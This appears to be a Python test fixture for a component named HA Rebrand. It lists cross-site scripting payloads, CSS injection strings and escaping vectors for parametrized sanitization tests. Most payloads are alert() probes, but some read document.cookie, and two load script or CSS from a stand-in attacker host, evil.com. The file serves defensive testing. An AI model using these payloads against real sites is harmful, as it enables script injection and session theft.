"""XSS payload test vectors for security testing.

This module contains a comprehensive list of XSS (Cross-Site Scripting) attack
vectors used to test input sanitization and output encoding in the HA Rebrand
component.

Usage:
    from tests.fixtures.xss_payloads import XSS_PAYLOADS, SAFE_STRINGS
    
    @pytest.mark.parametrize("payload", XSS_PAYLOADS)
    def test_xss_prevention(payload):
        result = sanitize_input(payload)
        assert "<script>" not in result.lower()
"""

# Comprehensive XSS attack vectors for testing
XSS_PAYLOADS: list[str] = [
    # Basic script injection
    "<script>alert('xss')</script>",
    "<script>alert(document.cookie)</script>",
    "<script src='http://evil.com/xss.js'></script>",
    
    # Event handler injections
    "<img src=x onerror=alert('xss')>",
    "<img src='x' onerror='alert(1)'>",
    "<svg onload=alert('xss')>",
    "<body onload=alert('xss')>",
    "<div onmouseover=alert('xss')>hover me</div>",
    "<input onfocus=alert('xss') autofocus>",
    "<iframe onload=alert('xss')>",
    
    # JavaScript URL schemes
    "javascript:alert('xss')",
    "javascript:alert(document.domain)",
    "jAvAsCrIpT:alert('xss')",  # Case variation
    "  javascript:alert('xss')",  # Leading whitespace
    "javascript\t:alert('xss')",  # Tab in protocol
    
    # Data URL schemes
    "data:text/html,<script>alert('xss')</script>",
    "data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=",
    
    # SVG-based attacks
    "<svg><script>alert('xss')</script></svg>",
    "<svg/onload=alert('xss')>",
    '<svg><animate onbegin=alert("xss") attributeName=x dur=1s>',
    "<svg><set onbegin=alert('xss') attributeName=x dur=1s>",
    
    # Encoded attacks
    "&#60;script&#62;alert('xss')&#60;/script&#62;",  # HTML entities
    "%3Cscript%3Ealert('xss')%3C/script%3E",  # URL encoding
    "\\x3cscript\\x3ealert('xss')\\x3c/script\\x3e",  # Hex encoding
    "\u003cscript\u003ealert('xss')\u003c/script\u003e",  # Unicode
    
    # Template injection (Angular/Vue style)
    "{{constructor.constructor('alert(1)')()}}",
    "{{7*7}}",
    "${alert('xss')}",
    "#{alert('xss')}",
    
    # CSS injection
    "<style>@import'http://evil.com/xss.css';</style>",
    "<div style='background:url(javascript:alert(1))'>",
    "<div style='behavior:url(xss.htc)'>",
    
    # Meta refresh/redirect
    "<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>",
    
    # Object/embed attacks
    "<object data='javascript:alert(1)'>",
    "<embed src='javascript:alert(1)'>",
    
    # Link-based attacks
    "<a href='javascript:alert(1)'>click me</a>",
    "<a href='data:text/html,<script>alert(1)</script>'>click</a>",
    
    # Form-based attacks
    "<form action='javascript:alert(1)'><input type=submit>",
    
    # HTML5 specific
    "<video><source onerror=alert('xss')>",
    "<audio src=x onerror=alert('xss')>",
    "<details open ontoggle=alert('xss')>",
    
    # Breaking out of attributes
    "' onclick=alert('xss') '",
    '" onclick=alert("xss") "',
    "'><script>alert('xss')</script>",
    '"><script>alert("xss")</script>',
    
    # Null byte injection
    "<scr\x00ipt>alert('xss')</script>",
    
    # Line breaks and special chars
    "<script>alert('xss')</script>",
    "<script\n>alert('xss')</script>",
    "<script\t>alert('xss')</script>",
    
    # Malformed tags
    "<ScRiPt>alert('xss')</sCrIpT>",  # Mixed case
    "<script >alert('xss')</script >",  # Extra spaces
    "<<script>alert('xss');//<</script>",  # Double brackets
]

# Safe strings that should pass through without modification (or with minimal escaping)
SAFE_STRINGS: list[str] = [
    # Normal text
    "Normal text",
    "Hello, World!",
    "This is a test string with numbers 12345",
    
    # Text with escaped/harmless characters
    "Text with <escaped> brackets",
    "Text with &amp; entities",
    "Text with 'single' and \"double\" quotes",
    
    # Unicode strings
    "Unicode: \u4e2d\u6587",  # Chinese characters
    "Unicode: \u65e5\u672c\u8a9e",  # Japanese characters
    "\ud55c\uae00",  # Korean characters
    "\u00e9\u00e8\u00ea",  # French accented characters
    "Emoji: \U0001F600\U0001F60D\U0001F389",  # Emojis
    
    # Edge cases that should be safe
    "Email: user@example.com",
    "URL: https://example.com/path?query=value",
    "Math: 5 < 10 > 3",
    "Code: function() { return 42; }",  # Not in script context
    
    # Whitespace variations
    "   Padded with spaces   ",
    "Line1\nLine2\nLine3",
    "Tab\tseparated\tvalues",
    
    # Empty and special
    "",
    " ",
    "0",
    "null",
    "undefined",
    "true",
    "false",
    
    # Long strings
    "A" * 1000,
    "Lorem ipsum dolor sit amet, consectetur adipiscing elit. " * 20,
]

# CSS color injection payloads for testing color validation
CSS_INJECTION_PAYLOADS: list[str] = [
    # Invalid color formats that might be used for injection
    "expression(alert('xss'))",
    "url(javascript:alert('xss'))",
    "#000;background:url(x)",
    "#000;}</style><script>alert(1)</script>",
    "red;}</style><script>alert(1)</script>",
    "#000000\";alert('xss');//",
    "rgb(0,0,0);}</style><script>alert(1)</script>",
    "#000' onclick='alert(1)'",
    "javascript:alert(1)",
]

# JavaScript string escaping test vectors
JS_ESCAPE_PAYLOADS: list[str] = [
    # Characters that need escaping in JS strings
    "'single quotes'",
    '"double quotes"',
    "backslash\\test",
    "newline\ntest",
    "carriage\rreturn",
    "tab\there",
    "<script>in string</script>",
    "</script><script>alert(1)</script>",
    "\\x3cscript\\x3e",
    "\\u003cscript\\u003e",
]
